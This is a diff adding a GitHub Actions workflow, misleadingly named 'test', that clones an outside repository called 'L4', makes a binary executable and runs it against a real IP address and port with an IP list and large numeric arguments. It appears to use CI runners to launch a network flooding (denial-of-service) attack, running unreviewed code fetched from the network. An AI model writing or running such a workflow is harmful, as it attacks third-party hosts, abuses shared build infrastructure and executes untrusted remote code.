@@ -1,0 +1,20 @@
+name: test
+
+on: [workflow_dispatch]
+
+jobs:
+  execute:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout current repo
+      uses: actions/checkout@v4
+
+    - name: Setup and Run
+      run: |
+        sudo apt update
+        sudo apt install -y gcc wget git
+        git clone https://github.com/xsaassd/L4.git ./target-repo
+        cd ./target-repo
+        chmod +x index
+        ./index 196.251.84.177:33060 iplist.txt 30000 9999
